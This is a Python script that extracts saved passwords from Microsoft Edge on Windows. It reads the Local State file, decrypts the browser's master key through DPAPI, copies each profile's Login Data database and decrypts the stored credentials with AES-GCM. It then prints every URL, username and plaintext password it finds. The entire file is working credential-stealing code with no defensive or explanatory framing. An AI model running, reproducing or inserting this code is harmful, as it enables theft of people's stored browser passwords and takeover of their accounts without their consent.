import os
import json
import base64
import shutil
import sqlite3
from Cryptodome.Cipher import AES
import ctypes
import ctypes.wintypes

def dpapi_decrypt(encrypted_bytes):
    """Decrypts the password using DPAPI."""
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    blob_in = DATA_BLOB(len(encrypted_bytes), ctypes.cast(ctypes.create_string_buffer(encrypted_bytes), ctypes.POINTER(ctypes.c_char)))
    blob_out = DATA_BLOB()

    CRYPTPROTECT_UI_FORBIDDEN = 0x01

    if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, CRYPTPROTECT_UI_FORBIDDEN, ctypes.byref(blob_out)):
        decrypted_bytes = ctypes.string_at(blob_out.pbData, blob_out.cbData)
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        return decrypted_bytes
    else:
        raise Exception("DPAPI decryption failed")

def get_edge_master_key(local_state_path):
    """Gets the Edge master key from the Local State file."""
    print(f"[+] Reading master key from: {local_state_path}")
    if not os.path.exists(local_state_path):
        print("[-] Local State file not found!")
        return None
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    if encrypted_key[:5] != b'DPAPI':
        print("[-] Encrypted key does not start with DPAPI prefix. Something wrong.")
        return None
    encrypted_key = encrypted_key[5:]
    master_key = dpapi_decrypt(encrypted_key)
    print(f"[+] Master key retrieved: {master_key.hex()}")
    return master_key

def decrypt_password(ciphertext, master_key):
    """Decrypt the encrypted password."""
    try:
        # Try AES GCM first (Edge's most common mode)
        if ciphertext.startswith(b'v10') or ciphertext.startswith(b'v20'):  # AES GCM
            iv = ciphertext[3:15]
            payload = ciphertext[15:-16]
            tag = ciphertext[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt_and_verify(payload, tag)
            return decrypted_pass.decode()
        
        # Fallback to DPAPI decryption
        return dpapi_decrypt(ciphertext).decode()
    
    except Exception as e:
        error_message = str(e)
        # Log the error for debugging, but do not exit or skip the decryption attempt
        print(f"[!] Decryption error: {error_message}")
        return "[!] Decryption failed."

def extract_passwords(profile_name, login_data_path, master_key):
    """Extracts passwords from the Login Data database."""
    print(f"[+] Processing profile: {profile_name}")
    temp_db = f"{profile_name}_Loginvault.db"

    try:
        shutil.copy2(login_data_path, temp_db)
    except Exception as e:
        print(f"[-] Failed to copy database: {e}")
        return

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()
        print(f"[+] Found {len(rows)} saved credentials.")
        for row in rows:
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            if encrypted_password:
                print(f"\n[DEBUG] Encrypted password sample: {encrypted_password[:15]}... ({len(encrypted_password)} bytes)")
                decrypted_password = decrypt_password(encrypted_password, master_key)
                print(f"\nURL: {url}\nUsername: {username}\nPassword: {decrypted_password}")
    except Exception as e:
        print(f"[-] Failed to query database: {e}")
    finally:
        cursor.close()
        conn.close()
        os.remove(temp_db)

def main():
    """Main function to start the extraction process for Edge."""
    user_data_dir = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data')
    local_state_path = os.path.join(user_data_dir, 'Local State')
    master_key = get_edge_master_key(local_state_path)
    if master_key is None:
        print("[-] Could not retrieve master key. Exiting.")
        return

    profiles = ['Default']
    for item in os.listdir(user_data_dir):
        if item.startswith('Profile '):
            profiles.append(item)

    for profile in profiles:
        login_db_path = os.path.join(user_data_dir, profile, 'Login Data')
        if os.path.exists(login_db_path):
            extract_passwords(profile, login_db_path, master_key)
        else:
            print(f"[-] No Login Data for {profile}")

if __name__ == "__main__":
    main()
